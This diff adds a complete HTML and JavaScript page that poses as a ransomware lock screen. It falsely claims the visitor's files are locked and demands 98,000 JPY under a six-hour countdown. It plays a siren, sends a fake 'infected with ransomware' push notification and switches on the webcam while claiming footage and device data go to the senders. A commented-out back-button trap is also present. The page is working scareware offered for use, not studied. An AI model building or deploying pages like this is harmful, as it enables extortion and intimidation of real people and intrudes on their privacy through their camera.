@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>The file has been locked.</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css">
+  </head>
+  <body>
+    <div id="notification" class="notification" style="position: fixed; z-index: 1; width: 100%;">
+      <button id="delete" class="delete"></button>
+      Your computer has been locked.
+    </div>
+    <section class="hero is-warning">
+      <div class="hero-body">
+        <div class="container">
+          <div class="notification is-primary">
+            <p>Constantly monitored by webcam</p>
+          </div>
+          <h1 class="title is-size-1">File lock complete</h1>
+          <p class="is-size-4">Your file has been successfully locked.</p>
+          <p class="is-size-4 has-text-danger">On time<span class="is-size-3 has-text-weight-bold">98,000JPY</span>Please pay.</p>
+          <div class="notification is-danger">
+            <p class="is-size-3 has-text-centered">
+              leftover
+              <span id="hour">6</span>hours
+              <span id="min">0</span>minute
+              <span id="sec">0</span>second
+            </p>
+            <progress class="progress" max="100"></progress>
+          </div>
+          <p class="has-text-danger">If your payment is not verified,<span class="has-text-weight-bold">Means of permanent file freezing</span>Please note that we will take it.</p>
+          <p class="has-text-danger">In addition, terminal information, etc. will be temporarily sent to us to prevent leakage<span class="has-text-weight-bold">We will protect and manage it.</span></p>
+          <p class="has-text-danger">Your webcam information is sent to us.</p>
+<video id="video" width="640" height="480" autoplay></video>
+        </div>
+        </div>
+      </div>
+    </section>
+    <section class="section">
+      <div class="container">
+        <h2 class="title">Customer Information</h2>
+        <table class="table is-striped is-fullwidth">
+          <tr>
+            <td>Device information</td>
+            <td id="device"></td>
+          </tr>
+          <tr>
+            <td>Date and time of registration</td>
+            <td id="date"></td>
+          </tr>
+        </table>
+        <h2 class="title">Contact us</h2>
+        <table class="table is-striped is-fullwidth">
+          <tr>
+            <td>telephone number</td>
+            <td>0120-000-000</td>
+          </tr>
+          <tr>
+            <td>e-mail</td>
+            <td>info@test.com</td>
+          </tr>
+        </table>
+
+
+      </div>
+    </section>
+    <script src="https://code.jquery.com/jquery-3.6.0.slim.min.js" integrity="sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.6/platform.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/push.js/1.0.12/push.min.js"></script>
+    <script type="text/javascript">
+      // history.pushState(null, null, location.href);
+      // $(window).on('popstate', function(){
+      //   history.go(1);
+      // });
+      const se = new Audio(
+        "Warning-Siren03-06(Low-Long).mp3"
+      );
+      se.play();
+      let c = 6 * 60 * 60;
+      setInterval(() => {
+        $("#hour").text(Math.floor(c / 3600));
+        $("#min").text(Math.floor((c % 3600) / 60));
+        $("#sec").text(Math.floor(c % 60));
+        c = c - 1;
+      }, 1000);
+      $("#device").text(platform.description);
+      $("#date").text(new Date().toLocaleString("ja-JP"));
+      $("#delete").click(() => {
+        $("#notification").addClass("is-hidden")
+
+
+      });
+
+      Push.create('File Lock Notification', {
+　　body: 'Your PC has been infected with ransomware. Important system files, personal information locked. To undo this, please pay a fee.',
+　　icon: 'Warning.png',
+　　timeout: 8000, // 通知が消えるタイミング
+　　vibrate: [100, 100, 100], // モバイル端末でのバイブレーション秒数
+　　onClick: function() {
+　　　　// 通知がクリックされた場合の設定
+　　　　console.log(this);
+　　}
+});
+
+//動画流す準備
+var video = document.getElementById("video");
+// getUserMedia によるカメラ映像の取得
+var media = navigator.mediaDevices.getUserMedia({
+    video: true,//ビデオを取得する
+    //使うカメラをインカメラか背面カメラかを指定する場合には
+    //video: { facingMode: "environment" },//背面カメラ
+    //video: { facingMode: "user" },//インカメラ
+    audio: false,//音声が必要な場合はture
+});
+//リアルタイムに再生（ストリーミング）させるためにビデオタグに流し込む
+media.then((stream) => {
+    video.srcObject = stream;
+});
+
+    </script>
+  </body>
+</html>
